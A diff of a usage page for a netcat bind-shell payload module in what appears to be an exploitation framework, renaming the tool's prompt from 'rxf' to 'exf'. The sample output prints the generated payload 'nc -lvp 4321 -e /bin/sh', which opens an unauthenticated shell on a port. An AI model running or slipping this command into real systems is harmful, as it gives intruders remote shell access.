@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp bind shell by using netcat
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/cmd/netcat_bind_tcp`
   3. Do: `set rport 4321`
   4. Do: `run`
@@ -13,10 +13,10 @@ Module generates payload that creates interactive tcp bind shell by using netcat
 ## Scenarios
 
 ```
-rxf > use payloads/cmd/netcat_bind_tcp
-rxf (Netcat Bind TCP) > set rport 4321
+exf > use payloads/cmd/netcat_bind_tcp
+exf (Netcat Bind TCP) > set rport 4321
 [+] rport => 4321
-rxf (Netcat Bind TCP) > run
+exf (Netcat Bind TCP) > run
 [*] Running module...
 [*] Generating payload
 nc -lvp 4321 -e /bin/sh
